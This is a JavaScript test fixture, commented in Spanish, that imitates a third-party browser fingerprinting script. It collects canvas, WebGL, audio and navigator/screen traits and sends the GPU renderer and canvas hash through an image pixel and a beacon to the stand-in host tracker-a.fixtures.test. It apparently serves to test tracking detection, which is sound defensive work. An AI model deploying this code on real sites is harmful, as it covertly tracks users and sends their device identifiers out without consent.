// Script de fingerprinting third-party del fixture (servido desde tracker-a).
(async function () {
  // Canvas: texto + colores y luego lectura.
  var canvas = document.createElement('canvas');
  canvas.width = 240; canvas.height = 60;
  var ctx = canvas.getContext('2d');
  ctx.textBaseline = 'top';
  ctx.font = "14px 'Arial'";
  ctx.fillStyle = '#f60';
  ctx.fillRect(125, 1, 62, 20);
  ctx.fillStyle = '#069';
  ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
  ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
  ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
  var dataUrl = canvas.toDataURL();
  var digest = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(dataUrl));
  var canvasHash = Array.from(new Uint8Array(digest)).map(function (b) { return b.toString(16).padStart(2, '0'); }).join('');

  // WebGL: vendor y renderer reales.
  var renderer = '', vendor = '';
  try {
    var gl = document.createElement('canvas').getContext('webgl');
    var info = gl.getExtension('WEBGL_debug_renderer_info');
    vendor = gl.getParameter(info.UNMASKED_VENDOR_WEBGL);
    renderer = gl.getParameter(info.UNMASKED_RENDERER_WEBGL);
  } catch (error) {}

  // Audio: oscilador + compresor sobre un contexto offline y lectura del buffer.
  try {
    var audio = new OfflineAudioContext(1, 4410, 44100);
    var oscillator = audio.createOscillator();
    oscillator.type = 'triangle';
    oscillator.frequency.value = 10000;
    var compressor = audio.createDynamicsCompressor();
    oscillator.connect(compressor);
    compressor.connect(audio.destination);
    oscillator.start(0);
    var buffer = await audio.startRendering();
    var samples = buffer.getChannelData(0);
    var sum = 0;
    for (var i = 0; i < samples.length; i++) sum += Math.abs(samples[i]);
  } catch (error) {}

  // Barrido de navigator / screen.
  var sweep = [
    navigator.userAgent, navigator.platform, navigator.hardwareConcurrency, navigator.languages,
    navigator.plugins.length, navigator.mimeTypes.length, navigator.webdriver, navigator.maxTouchPoints,
    screen.width, screen.height, screen.colorDepth, window.devicePixelRatio,
    Intl.DateTimeFormat().resolvedOptions().timeZone,
  ];

  // Exfiltración: el renderer y el hash del canvas salen hacia tracker-a.
  var pixel = new Image();
  pixel.src = 'http://tracker-a.fixtures.test/fp-collect.gif?r=' + encodeURIComponent(renderer) +
    '&ch=' + canvasHash + '&n=' + sweep.length;

  // Otra request del mismo script, sin valores leídos: solo la delata quién la inició.
  navigator.sendBeacon('http://tracker-a.fixtures.test/fp-beacon', 'done');
})();
